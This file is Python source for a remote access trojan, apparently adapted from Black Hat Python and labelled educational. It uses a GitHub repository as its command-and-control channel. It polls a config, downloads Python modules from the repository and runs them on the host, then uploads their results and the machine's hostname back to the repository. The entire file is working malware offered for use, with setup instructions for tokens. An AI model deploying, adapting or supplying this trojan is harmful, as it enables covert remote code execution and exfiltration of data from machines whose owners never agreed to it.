#!/usr/bin/env python3
"""
GitHub-based RAT (Remote Access Trojan) Framework
Based on Black Hat Python by Justin Seitz and Tim Arnold
Educational purposes only
"""

import json
import os
import sys
import time
import base64
import subprocess
import threading
from pathlib import Path

# Add modules path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'modules'))

try:
    import requests
except ImportError:
    print("[-] requests module not found. Install with: pip install requests")
    sys.exit(1)

class GitHubRAT:
    def __init__(self, github_token, repo_owner, repo_name):
        """
        Initialize the GitHub-based RAT
        
        Args:
            github_token (str): GitHub personal access token
            repo_owner (str): Repository owner username
            repo_name (str): Repository name
        """
        self.github_token = github_token
        self.repo_owner = repo_owner
        self.repo_name = repo_name
        self.base_url = f"https://api.github.com/repos/{repo_owner}/{repo_name}"
        self.headers = {
            "Authorization": f"token {github_token}",
            "Accept": "application/vnd.github.v3+json"
        }
        self.running = True
        self.config_file = "abc.json"
        self.modules = {}
        
    def load_config(self):
        """Load configuration from GitHub repository"""
        try:
            config_url = f"{self.base_url}/contents/config/{self.config_file}"
            response = requests.get(config_url, headers=self.headers)
            
            if response.status_code == 200:
                content = response.json()
                # Decode base64 content
                config_data = base64.b64decode(content['content']).decode('utf-8')
                return json.loads(config_data)
            else:
                print(f"[-] Failed to load config: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"[-] Error loading config: {e}")
            return None
    
    def load_module(self, module_name):
        """Dynamically load a module from the GitHub repository"""
        try:
            module_url = f"{self.base_url}/contents/modules/{module_name}.py"
            response = requests.get(module_url, headers=self.headers)
            
            if response.status_code == 200:
                content = response.json()
                # Decode base64 content
                module_code = base64.b64decode(content['content']).decode('utf-8')
                
                # Create a temporary module file
                temp_module_path = f"/tmp/{module_name}.py"
                with open(temp_module_path, 'w') as f:
                    f.write(module_code)
                
                # Import the module
                spec = __import__(module_name)
                self.modules[module_name] = spec
                
                print(f"[+] Module {module_name} loaded successfully")
                return True
            else:
                print(f"[-] Failed to load module {module_name}: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] Error loading module {module_name}: {e}")
            return False
    
    def execute_module(self, module_name, **kwargs):
        """Execute a loaded module"""
        try:
            if module_name in self.modules:
                module = self.modules[module_name]
                if hasattr(module, 'run'):
                    result = module.run(**kwargs)
                    return result
                else:
                    print(f"[-] Module {module_name} has no run function")
                    return None
            else:
                print(f"[-] Module {module_name} not loaded")
                return None
                
        except Exception as e:
            print(f"[-] Error executing module {module_name}: {e}")
            return None
    
    def upload_results(self, module_name, results):
        """Upload module execution results to GitHub"""
        try:
            # Create a results file
            timestamp = int(time.time())
            results_filename = f"results_{module_name}_{timestamp}.json"
            
            results_data = {
                "module": module_name,
                "timestamp": timestamp,
                "results": results
            }
            
            # Upload to data directory
            upload_url = f"{self.base_url}/contents/data/{results_filename}"
            content = base64.b64encode(json.dumps(results_data, indent=2).encode()).decode()
            
            data = {
                "message": f"Results from {module_name} module",
                "content": content
            }
            
            response = requests.put(upload_url, headers=self.headers, json=data)
            
            if response.status_code == 201:
                print(f"[+] Results uploaded to {results_filename}")
                return True
            else:
                print(f"[-] Failed to upload results: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] Error uploading results: {e}")
            return False
    
    def update_status(self, status):
        """Update Trojan status on GitHub"""
        try:
            status_filename = "trojan_status.json"
            status_data = {
                "status": status,
                "timestamp": int(time.time()),
                "hostname": os.uname().nodename if hasattr(os, 'uname') else 'unknown'
            }
            
            upload_url = f"{self.base_url}/contents/status/{status_filename}"
            content = base64.b64encode(json.dumps(status_data, indent=2).encode()).decode()
            
            data = {
                "message": "Status update",
                "content": content
            }
            
            response = requests.put(upload_url, headers=self.headers, json=data)
            
            if response.status_code == 201:
                print(f"[+] Status updated: {status}")
                return True
            else:
                print(f"[-] Failed to update status: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] Error updating status: {e}")
            return False
    
    def run(self):
        """Main Trojan execution loop"""
        print("[*] Starting GitHub RAT...")
        
        # Update initial status
        self.update_status("active")
        
        while self.running:
            try:
                # Load configuration
                config = self.load_config()
                if not config:
                    print("[-] No configuration found, waiting...")
                    time.sleep(60)
                    continue
                
                # Load and execute modules
                for module_config in config:
                    module_name = module_config.get('module')
                    if module_name:
                        print(f"[*] Processing module: {module_name}")
                        
                        # Load module if not already loaded
                        if module_name not in self.modules:
                            if not self.load_module(module_name):
                                continue
                        
                        # Execute module
                        results = self.execute_module(module_name)
                        if results:
                            # Upload results
                            self.upload_results(module_name, results)
                
                # Wait before next iteration
                print("[*] Waiting for next iteration...")
                time.sleep(300)  # 5 minutes
                
            except KeyboardInterrupt:
                print("[*] Shutting down...")
                self.running = False
                self.update_status("stopped")
            except Exception as e:
                print(f"[-] Error in main loop: {e}")
                time.sleep(60)

def main():
    """Main function to run the Trojan"""
    # Configuration - load from environment variables
    import os
    GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
    REPO_OWNER = os.getenv('REPO_OWNER')
    REPO_NAME = os.getenv('REPO_NAME')
    
    if not all([GITHUB_TOKEN, REPO_OWNER, REPO_NAME]):
        print("[-] Please set environment variables:")
        print("    GITHUB_TOKEN=your_token_here")
        print("    REPO_OWNER=your_username")
        print("    REPO_NAME=your_repository_name")
        print("[*] Get your token from: https://github.com/settings/tokens")
        sys.exit(1)
    
    # Create and run the Trojan
    trojan = GitHubRAT(GITHUB_TOKEN, REPO_OWNER, REPO_NAME)
    trojan.run()

if __name__ == "__main__":
    main()
